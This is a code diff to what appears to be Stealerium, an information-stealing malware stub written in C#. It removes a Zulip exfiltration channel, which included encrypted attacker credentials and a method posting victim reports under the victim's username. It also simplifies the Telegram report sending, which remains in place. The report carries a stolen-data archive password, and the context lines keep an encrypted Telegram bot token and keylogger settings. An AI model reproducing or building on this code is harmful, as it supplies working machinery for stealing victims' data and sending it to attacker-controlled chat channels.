@@ -17,9 +17,6 @@ namespace Stealerium.Stub
         private const int MaxKeylogs = 5;
 
         private static string TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
-        private static string ZulipAPIBaseUrl = StringsCrypt.DecryptConfig("ENCRYPTED:hu7mPNLn8F3W1m8DcwM5LXHInCJglBwFsWCfcHCJ9tF7oYejzA1wmRf7U4KxfmKxWUHNJ/cIv306TuGoVjZvAA==");
-        private static string ZulipEmail = StringsCrypt.DecryptConfig("ENCRYPTED:CPB7ti0A5zas/0dF4XBKzDiUIfmQ5RgrLQvDrYCST4M=");
-        private static string ZulipAPIKey = StringsCrypt.DecryptConfig("ENCRYPTED:cYs6KSRyO3yMrWGQDOmKxivjCVxRHP8X2elXQtdRGbiad1fFkV3DBIHK2EbuIBDA");
 
         // Message id location
         private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
@@ -121,54 +118,6 @@ namespace Stealerium.Stub
 
             // Return 0 if there was an error or the request failed
             return 0;
-        }
-
-        /// <summary>
-        /// Send message to Zulip stream (channel) asynchronously
-        /// </summary>
-        /// <param name="streamName">Stream (channel) name</param>
-        /// <param name="topic">Topic under the stream</param>
-        /// <param name="messageContent">Message content</param>
-        /// <returns>A Task representing the asynchronous operation</returns>
-        public static async Task SendZulipMessageAsync(string streamName, string topic, string messageContent)
-        {
-            try
-            {
-                using (HttpClient client = new HttpClient())
-                {
-                    // Build the request body with the correct content type (form data)
-                    var formData = new FormUrlEncodedContent(new[]
-                    {
-                        new KeyValuePair<string, string>("type", "stream"),          // Message type (stream)
-                        new KeyValuePair<string, string>("to", streamName),          // Stream name
-                        new KeyValuePair<string, string>("topic", topic),            // Topic under the stream
-                        new KeyValuePair<string, string>("content", messageContent)  // Actual message content
-                    });
-
-                    // Add Basic authentication using Zulip email and API key
-                    var byteArray = Encoding.ASCII.GetBytes($"{ZulipEmail}:{ZulipAPIKey}");
-                    client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Basic", Convert.ToBase64String(byteArray));
-
-                    // Send the POST request asynchronously
-                    HttpResponseMessage response = await client.PostAsync(ZulipAPIBaseUrl, formData);
-
-                    // Check if the request was successful
-                    if (response.IsSuccessStatusCode)
-                    {
-                        Logging.Log("Message sent to Zulip successfully.");
-                    }
-                    else
-                    {
-                        // Log the detailed error message
-                        string responseBody = await response.Content.ReadAsStringAsync();
-                        Logging.Log($"Failed to send message to Zulip. Status code: {response.StatusCode}, Response: {responseBody}");
-                    }
-                }
-            }
-            catch (Exception error)
-            {
-                Logging.Log("Zulip >> SendMessage exception:\n" + error);
-            }
         }
 
         /// <summary>
@@ -396,24 +345,8 @@ namespace Stealerium.Stub
                        + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                        + "```";
 
-            // Send the report to Telegram
-            int last = GetLatestMessageId();
-            if (last != -1)
-            {
-                Logging.Log($"Editing existing message with ID: {last}");
-                await EditMessageAsync(info, last).ConfigureAwait(false);
-                Logging.Log("Message edited successfully.");
-            }
-            else
-            {
-                Logging.Log("No existing message ID found. Sending new message.");
-                int newMessageId = await SendMessageAsync(info).ConfigureAwait(false);
-                SetLatestMessageId(newMessageId);
-                Logging.Log($"New message sent with ID: {newMessageId}");
-            }
+                await SendMessageAsync(info).ConfigureAwait(false);
 
-            // Send the report to Zulip
-            await SendZulipMessageAsync("Szurubooru", SystemInfo.Username, info).ConfigureAwait(false);
         }
 
         /// <summary>
